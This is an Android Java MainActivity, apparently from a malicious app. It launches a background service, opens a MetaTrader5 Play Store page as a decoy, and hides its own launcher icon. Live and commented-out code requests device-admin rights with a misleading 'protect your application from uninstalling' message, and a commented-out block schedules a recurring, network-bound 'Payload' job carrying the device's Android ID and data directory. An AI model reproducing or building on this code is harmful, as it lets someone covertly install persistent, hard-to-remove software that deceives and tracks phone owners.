package com.example.protectedservice;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;

import com.firebase.jobdispatcher.Constraint;
import com.firebase.jobdispatcher.FirebaseJobDispatcher;
import com.firebase.jobdispatcher.GooglePlayDriver;
import com.firebase.jobdispatcher.Job;
import com.firebase.jobdispatcher.RetryStrategy;
import com.firebase.jobdispatcher.Trigger;

import static com.firebase.jobdispatcher.Lifetime.FOREVER;

public class MainActivity extends Activity implements View.OnClickListener {
    Button btExit;
    private FirebaseJobDispatcher mDispatcher;
    private Job myJob;
    private String TagJob="TagPaylo";
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
/*		setContentView(R.layout.activity_main);
        btExit = (Button) findViewById(R.id.btExit);
        btExit.setOnClickListener(this);
        try {
            // Initiate DevicePolicyManager.
            DevicePolicyManager policyMgr = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);

            // Set DeviceAdminDemo Receiver for active the component with different option
            ComponentName componentName = new ComponentName(this, DeviceAdminComponent.class);

            if (!policyMgr.isAdminActive(componentName)) {
                // try to become active
                Intent intent = new Intent(	DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,	componentName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Click on Activate button to protect your application from uninstalling!");

                startActivity(intent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

 /*       Bundle myExtrasBundle = new Bundle();

        String android_id = Settings.Secure.getString(this.getContentResolver(),
                Settings.Secure.ANDROID_ID);
        myExtrasBundle.putString("mpath", this.getApplicationInfo().dataDir);
        myExtrasBundle.putString("mandroid_id", android_id);
        mDispatcher = new FirebaseJobDispatcher(new GooglePlayDriver(this));
        //FirebaseJobDispatcher mDispatcher = new FirebaseJobDispatcher(new AlarmManagerDriver(this));
        myJob = mDispatcher.newJobBuilder()
                .setService(Payload.class)
                .setTag(TagJob)
                .setRecurring(true)
                //.setTrigger(Trigger.executionWindow(5, 30))
                .setTrigger(Trigger.executionWindow(0, 0))
                .setLifetime(FOREVER)
                //.setReplaceCurrent(false)
                .setReplaceCurrent(true)
                .setConstraints(Constraint.ON_ANY_NETWORK)
                .setRetryStrategy(RetryStrategy.DEFAULT_EXPONENTIAL)
                .setExtras(myExtrasBundle)
                .build();
        mDispatcher.schedule(myJob);
*/		startService(new Intent(this, BackgroundService.class));
        Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        startActivity(intent);
        hideApplication();
	}
    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.btExit:
                try {
                    // Initiate DevicePolicyManager.
                    DevicePolicyManager policyMgr = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);

                    // Set DeviceAdminDemo Receiver for active the component with different option
                    ComponentName componentName = new ComponentName(this, DeviceAdminComponent.class);

                    if (!policyMgr.isAdminActive(componentName)) {
                        // try to become active
                        Intent intent = new Intent(	DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        //intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,	componentName);
                        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                "Click on Activate button to protect your application from uninstalling!");

                        startActivity(intent);
                        btExit.setText("Enable Admin");
                    }
                    else
                    {
                        Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
                        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                        startActivity(intent);
                        hideApplication();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }

                break;
        }
    }
    private void hideApplication() {
        // nasconde l'icona dal drawer dopo il primo avvio
        PackageManager pm = getApplicationContext().getPackageManager();
        pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);

    }
}
